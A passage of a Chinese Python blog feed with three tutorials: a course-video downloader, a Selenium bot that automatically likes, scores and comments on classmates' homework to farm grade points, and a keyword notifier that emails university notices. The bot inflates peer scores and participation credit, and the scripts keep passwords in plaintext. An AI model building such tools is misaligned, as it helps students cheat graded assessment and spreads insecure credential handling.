punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[下载进度]:{}{:.2f}%"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">'&gt;'</span><span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">(</span>size<span class="token operator">*</span><span class="token number">50</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>size<span class="token operator">*</span><span class="token number">100</span><span class="token operator">/</span>content_size<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n下载成功,文件自动帮您保存在d:/umn_spider_video/'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'文件已存在'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'爬取失败'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    url_course<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入课程首页的网址，如果不清楚请看教程：'</span><span class="token punctuation">)</span>    <span class="token comment"># url_course='https://m.umu.cn/course/?groupId=4138993&amp;sKey=0e6490a0d5ef477593326d2e8cd53faa&amp;from_type=myparticipate'#专业教学设计与案例分析</span>    <span class="token comment"># url_course='https://m.umu.cn/course/?groupId=5001078&amp;sKey=e30c05f1c34302d77478bf49a21daec2&amp;from_type=myparticipate'  #职业教育德育研究</span>    video_list<span class="token operator">=</span>video_url_get<span class="token punctuation">(</span>url_course<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'已找到资源共%d个'</span><span class="token operator">%</span><span class="token builtin">len</span><span class="token punctuation">(</span>video_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> url <span class="token keyword">in</span> video_list<span class="token punctuation">:</span>        downloader<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'任务全部完成，欢迎您的再次使用，按任意键退出。'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了这个程序模板，只要把url_course换成你自己的课程url，就可以爬取到全部的视频，按理说应该可以爬取任意的课程视频了，我又用这个程序取爬取了另外一门课程的视频，实测是没问题的。<br>就是注意一点，如果用于盈利的话，就涉及侵权，侵权违法，不要说是我教的。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python网络爬虫2—网课自动刷点赞刷评论刷积分</title>
      <link href="/2022/03/19/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB2%E2%80%94%E7%BD%91%E8%AF%BE%E8%87%AA%E5%8A%A8%E5%88%B7%E7%82%B9%E8%B5%9E%E5%88%B7%E8%AF%84%E8%AE%BA%E5%88%B7%E7%A7%AF%E5%88%86/"/>
      <url>/2022/03/19/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB2%E2%80%94%E7%BD%91%E8%AF%BE%E8%87%AA%E5%8A%A8%E5%88%B7%E7%82%B9%E8%B5%9E%E5%88%B7%E8%AF%84%E8%AE%BA%E5%88%B7%E7%A7%AF%E5%88%86/</url>
      
        <content type="html"><![CDATA[<p>疫情期间上网课，学校使用UMN教学平台进行授课，点赞和评论都可以获得积分，积分影响最终成绩，别的同学都是手动弄，我觉得太麻烦，所以我打算用Python刷一刷。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#2.2版本公告：新增账号保存功能，用户只需要输入一次账号密码，会自动以文本格式保存在当前文件夹下，第二次运行会自动读取</span><span class="token comment">#2.1版本公告：程序通过相对路径找到chromedriver.exe，不需要用户再手动填写绝对路径了</span><span class="token comment">#2.0版本公告：加入自动评分和评论的功能，加入可显示剩余人数的功能</span><span class="token comment">#1.7版本公告：做了代码优化，并封装了部分复用的代码</span><span class="token comment">#1.6版本公告：加入了用户自定义输入，可自定义评论内容</span><span class="token comment">#1.5版本公告：修复了因找不到chromedriver而造成的'chromedriver' executable needs  to be in PATH的bug</span><span class="token comment">#1.4版本公告：修复因跳过页面展开而造成的实际人数统计的错误，加入了页面滑动以及显性等待机制，最长等待20秒</span><span class="token comment">#1.3版本公告：修复一处因服务器排队而造成的程序无法运行的bug，加入了3分钟的页面隐性等待</span><span class="token comment">#1.2版本公告：修复一处在展开页面时，因为网络不稳定而造成的list index out of range的bug，加入了异常跳过机制</span><span class="token comment">#1.1版本公告：修复一处因页面返回而导致的实际点赞人数不足的bug，在页面返回时需重新展开所有作业名单</span><span class="token comment">#unm自动点赞器1.0功能介绍：用于在unm平台实现对其他同学作业的自动点赞。</span><span class="token keyword">import</span> time<span class="token punctuation">,</span>pyautogui<span class="token punctuation">,</span>openpyxl<span class="token punctuation">,</span>os<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>keys <span class="token keyword">import</span> Keys<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions <span class="token keyword">as</span> EC<span class="token keyword">def</span> <span class="token function">look_all_task</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----展开所有作业名单----#</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            pyautogui<span class="token punctuation">.</span>scroll<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10000</span><span class="token punctuation">)</span>            more <span class="token operator">=</span> WebDriverWait<span class="token punctuation">(</span>driver<span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>CLASS_NAME<span class="token punctuation">,</span><span class="token string">"btn-inner"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"arguments[0].click();"</span><span class="token punctuation">,</span>more<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'跳过因为网络不稳定展开页面失败而造成的list index out of range问题'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">account_save</span><span class="token punctuation">(</span>user_acount<span class="token punctuation">,</span>user_password<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----保存用户账号密码信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span>user_acount<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">,</span>user_password<span class="token punctuation">]</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">account_load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----读取用户账号密码信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f_content<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f_content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>f_content<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment">#----用户自定义输入----#</span>    base_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>  <span class="token comment">#获取当前文件夹的绝对路径</span>    account_path<span class="token operator">=</span>base_dir<span class="token operator">+</span><span class="token string">"//account.txt"</span>    user_comment<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你要评论的内容，（样例：你的作业做得真好，非常优秀）：'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>account_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        user_acount<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你的umn账号:'</span><span class="token punctuation">)</span>        user_password<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你的umn密码:'</span><span class="token punctuation">)</span>        account_save<span class="token punctuation">(</span>user_acount<span class="token punctuation">,</span>user_password<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        user_acount<span class="token punctuation">,</span>user_password<span class="token operator">=</span>account_load<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#----登录网站----#</span>    url_task<span class="token operator">=</span><span class="token string">'https://m.umu.cn/session/exercise/?surl=1SqbQ623d'</span>    url<span class="token operator">=</span><span class="token string">'https://www.umu.cn/index#/index'</span>    driver<span class="token operator">=</span>webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>executable_path<span class="token operator">=</span><span class="token string">'chromedriver.exe'</span><span class="token punctuation">)</span>    <span class="token comment"># driver=webdriver.Chrome()</span>    driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    driver<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">180</span><span class="token punctuation">)</span> <span class="token comment">#隐式等待，最长等待180秒</span>    account<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'input-text'</span><span class="token punctuation">)</span>    account<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>user_acount<span class="token punctuation">)</span>    account<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>user_password<span class="token punctuation">)</span>    button<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_class_name<span class="token punctuation">(</span><span class="token string">'btn-warning'</span><span class="token punctuation">)</span>    button<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token comment">#----转到作业二的界面----#</span>    driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_task<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    look_all_task<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#----统计任务数----#</span>    look_task<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'review-status'</span><span class="token punctuation">)</span>    surplus<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>look_task<span class="token punctuation">)</span>    <span class="token comment">#----进入个人作业详情页----#</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        look_task<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_elements_by_class_name<span class="token punctuation">(</span><span class="token string">'review-status'</span><span class="token punctuation">)</span>        driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"arguments[0].click();"</span><span class="token punctuation">,</span>look_task<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>        driver<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>        <span class="token comment">#----点赞----#</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            like<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_class_name<span class="token punctuation">(</span><span class="token string">'liked-user-prise'</span><span class="token punctuation">)</span>            driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">"arguments[0].click();"</span><span class="token punctuation">,</span>like<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'点赞成功'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'没有找到点赞功能'</span><span class="token punctuation">)</span>        <span class="token comment">#----评论打分----#</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            comment_button <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element_by_class_name<span class="token punctuation">(</span><span class="token string">'do-score'</span><span class="token punctuation">)</span>            pyautogui<span class="token punctuation">.</span>scroll<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1000</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            comment_button<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            score<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[2]/div/div[2]/div/div/div/div[2]/div/div/div/div[2]/div[1]/div/input'</span><span class="token punctuation">)</span>            score<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">'100'</span><span class="token punctuation">)</span>            comment<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[2]/div/div[2]/div/div/div/div[2]/div/div/div/div[3]/div/textarea'</span><span class="token punctuation">)</span>            comment<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>user_comment<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>            submit<span class="token operator">=</span>driver<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'/html/body/div[2]/div/div[2]/div/div/div/div[1]/div/span[2]/span'</span><span class="token punctuation">)</span>            submit<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'评论成功'</span><span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'读取标签失败'</span><span class="token punctuation">)</span>        surplus<span class="token operator">-=</span><span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'剩余'</span><span class="token punctuation">,</span>surplus<span class="token punctuation">)</span>        <span class="token comment">#----转到作业二的界面并展开作业列表----#</span>        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url_task<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>        driver<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>         look_all_task<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结：这种程序实际上是模仿浏览器进行操作，很难防范，可造成的危害也比较有限，纯属娱乐性质。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫项目一—消息通知器</title>
      <link href="/2022/03/18/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB1%E2%80%94%E6%B6%88%E6%81%AF%E9%80%9A%E7%9F%A5%E5%99%A8/"/>
      <url>/2022/03/18/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB1%E2%80%94%E6%B6%88%E6%81%AF%E9%80%9A%E7%9F%A5%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、制作背景"><a href="#一、制作背景" class="headerlink" title="一、制作背景"></a>一、制作背景</h2><p>如果要应聘某个单位，但是不知道这个单位什么时候发布招聘信息，总不能天天上官网去看吧，对于我这样孤僻的性格，消息闭塞，很有可能错过重要的招聘信息。<br>因此，我需要一个程序可以自动爬取网站的消息栏，如果发现有自己关注的信息，则发一封邮件给自己。<br>例如海盐商贸学校发布了一条招聘计算机教师的通知，我需要第一时间得到通知。</p><h2 id="二、代码分享"><a href="#二、代码分享" class="headerlink" title="二、代码分享"></a>二、代码分享</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> smtplib<span class="token keyword">import</span> schedule<span class="token keyword">import</span> time<span class="token punctuation">,</span>os<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">from</span> email<span class="token punctuation">.</span>mime<span class="token punctuation">.</span>text <span class="token keyword">import</span> MIMEText<span class="token keyword">from</span> email<span class="token punctuation">.</span>header <span class="token keyword">import</span> Header <span class="token keyword">def</span> <span class="token function">account_save</span><span class="token punctuation">(</span>keyword<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----保存用户邮箱和关键词信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f<span class="token punctuation">.</span>writelines<span class="token punctuation">(</span><span class="token punctuation">[</span>keyword<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">,</span>qqmail<span class="token punctuation">]</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">account_load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----读取邮箱和关键词信息----#</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>account_path<span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        f_content<span class="token operator">=</span>f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> f_content<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>f_content<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">def</span> <span class="token function">YanGongBu_spider</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----爬取研工部通知栏前三项----#</span>    headers<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user-agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'</span><span class="token punctuation">}</span>    url<span class="token operator">=</span><span class="token string">'http://yjsb.zjnu.edu.cn/'</span>    res<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    soup<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">,</span><span class="token string">'html.parser'</span><span class="token punctuation">)</span>    titles<span class="token operator">=</span>soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"meta-title"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> title <span class="token keyword">in</span> titles<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> title<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            send_email<span class="token punctuation">(</span>title<span class="token punctuation">.</span>text<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">send_email</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#----使用710464440代发邮件----#</span>    account<span class="token operator">=</span>qqmail    password<span class="token operator">=</span><span class="token string">'这里填写邮箱密码'</span>    reveiver<span class="token operator">=</span><span class="token string">'710464440@qq.com'</span>    mailhost<span class="token operator">=</span><span class="token string">'smtp.qq.com'</span>    qqmail<span class="token operator">=</span>smtplib<span class="token punctuation">.</span>SMTP<span class="token punctuation">(</span><span class="token punctuation">)</span>    qqmail<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>mailhost<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">)</span>    qqmail<span class="token punctuation">.</span>login<span class="token punctuation">(</span>account<span class="token punctuation">,</span>password<span class="token punctuation">)</span>    content<span class="token operator">=</span>title    massage<span class="token operator">=</span>MIMEText<span class="token punctuation">(</span>content<span class="token punctuation">,</span><span class="token string">"plain"</span><span class="token punctuation">,</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>    subject<span class="token operator">=</span><span class="token string">'研工部通知'</span>    massage<span class="token punctuation">[</span><span class="token string">'Subject'</span><span class="token punctuation">]</span><span class="token operator">=</span>Header<span class="token punctuation">(</span>subject<span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        qqmail<span class="token punctuation">.</span>sendmail<span class="token punctuation">(</span>account<span class="token punctuation">,</span>reveiver<span class="token punctuation">,</span>massage<span class="token punctuation">.</span>as_string<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'邮件发送成功'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'邮件发送失败'</span><span class="token punctuation">)</span>    qqmail<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    base_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span>  <span class="token comment">#获取当前文件夹的绝对路径</span>    account_path<span class="token operator">=</span>base_dir<span class="token operator">+</span><span class="token string">"/account.txt"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>account_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>account_path<span class="token punctuation">)</span><span class="token punctuation">:</span>        keyword<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入你想关注的内容的关键词(例如：招聘)：'</span><span class="token punctuation">)</span>        qqmail<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入你的qq邮箱地址(例如：715555555@qq.com)："</span><span class="token punctuation">)</span>        account_save<span class="token punctuation">(</span>keyword<span class="token punctuation">,</span>qqmail<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        keyword<span class="token punctuation">,</span>qqmail<span class="token operator">=</span>account_load<span class="token punctuation">(</span><span class="token punctuation">)</span>    YanGongBu_spider<span class="token punctuation">(</span>keyword<span class="token punctuation">)</span>    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'按任意键退出程序'</span><span class="token punctuation">)</span> <span class="token comment">#这段代码用于挂远程服务器</span><span class="token comment">#schedule.every().day.at('17:30').do(YanGongBu_spider)</span><span class="token comment">#while True:</span>    <span class="token comment">#schedule.run_pending()</span>    <span class="token comment">#time.sleep(1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、使用小tip"><a href="#三、使用小tip" class="headerlink" title="三、使用小tip"></a>三、使用小tip</h2><p>如果是本地使用的话，利用windows的任务计划程序，每天定时运行程序，如果那个时间电脑没开，程序则不会运行，而且如果在玩游戏，可能会被黑窗口弹一下，比较影响体验。<br>因此，我们需要将代码挂在远程的服务器上，服务器24小时运行，完美解决问题。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 项目教学 </tag>
            
            <tag> 网络爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python数据分析3—openpyxl</title>
      <link href="/2022/03/17/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%903%E2%80%94openpyxl%E5%BA%93/"/>
      <url>/2022/03/17/Python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%903%E2%80%94openpyxl%E5%BA%93/</url>
      
